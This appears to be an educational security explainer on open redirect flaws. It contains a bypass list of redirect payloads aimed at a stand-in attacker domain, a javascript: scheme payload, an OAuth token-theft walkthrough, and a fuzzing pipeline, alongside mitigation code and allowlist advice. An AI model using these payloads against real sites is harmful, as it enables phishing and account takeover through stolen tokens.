# What is Open Redirect?

An Open Redirect is a page that takes a URL from user input and redirects the browser there without validating the destination. On its own it is often rated low, but it is a reliable building block: it powers convincing phishing, steals OAuth tokens, and can be chained into SSRF or filter bypasses.

## How it works

Vulnerable code sends the browser wherever the parameter says:

```php
// VULNERABLE
header("Location: " . $_GET['next']);
```

Request `?next=https://evil.com` and the victim - who clicked a link on the *real* site - lands on the attacker's clone.

## Why it matters (impact)

- **Phishing** - the link starts with the trusted domain, so victims trust it: `https://bank.tld/login?next=https://evil-bank.tld`
- **OAuth/SSO token theft** - if `redirect_uri` is not strictly validated, the auth code/token is sent to the attacker
- **Chaining** - bypass SSRF allowlists, WAFs, or CSP that trust redirects

## Where to look

Parameters named: `url`, `next`, `redirect`, `redirect_uri`, `return`, `returnTo`, `dest`, `destination`, `continue`, `go`, `r`, `u`, `checkout_url`, `callback`.

## Test payloads (bypass ladder)

```text
# 1. Straightforward
?next=https://evil.com
?next=//evil.com                 (protocol-relative - very common bug)

# 2. Backslash / mixed slashes (browsers normalise these)
?next=/\evil.com
?next=\/\/evil.com
?next=/%2f/evil.com

# 3. "Must contain our domain" checks
?next=https://target.tld.evil.com       (evil.com is the real domain)
?next=https://evil.com/target.tld
?next=https://target.tld@evil.com       (userinfo trick -> goes to evil.com)
?next=https://evil.com#target.tld
?next=https://evil.com?target.tld

# 4. Encoding
?next=%2F%2Fevil.com
?next=https:%2f%2fevil.com
?next=%68%74%74%70%73://evil.com

# 5. JS/data scheme (if reflected into a JS redirect)
?next=javascript:alert(document.domain)
```

## Full walkthrough - OAuth token theft

1. Login flow: `https://sso.tld/authorize?client_id=1&redirect_uri=https://app.tld/cb&response_type=token`
2. Change to `redirect_uri=https://app.tld.evil.com/cb` (or `@evil.com`).
3. If the server accepts it, the access token is delivered to your server in the URL fragment.
4. Capture it from your logs -> account takeover.

## Tools

- [Burp Suite](https://portswigger.net/burp) - follow redirects and test bypasses
- [OpenRedireX](https://github.com/devanshbatham/OpenRedireX) - fuzz redirect params at scale
- [gf](https://github.com/tomnomnom/gf) (with `gf redirect` patterns) - grep candidate params

```bash
# Collect URLs, filter redirect params, fuzz for open redirect
cat urls.txt | gf redirect | openredirex -p payloads.txt
```

## Mitigation - the fix

```python
# SAFE - map an ID to a fixed destination, never trust the raw URL
DESTS = {"home": "/dashboard", "help": "/support"}
return redirect(DESTS.get(request.args.get("next"), "/dashboard"))
```

- Prefer server-side mapping keys over raw URLs.
- If external redirects are needed, validate against a strict **allowlist** of domains.
- Force redirects to relative paths, or show an interstitial "you are leaving" warning.
- For OAuth: exact-match `redirect_uri` against pre-registered values.

## Practice

- [PortSwigger DOM-based open redirect labs](https://portswigger.net/web-security/dom-based/open-redirection)

## Deep dive

- [Open Redirect - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [OWASP Unvalidated Redirects Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

## CWE

- CWE-601: URL Redirection to Untrusted Site (Open Redirect)
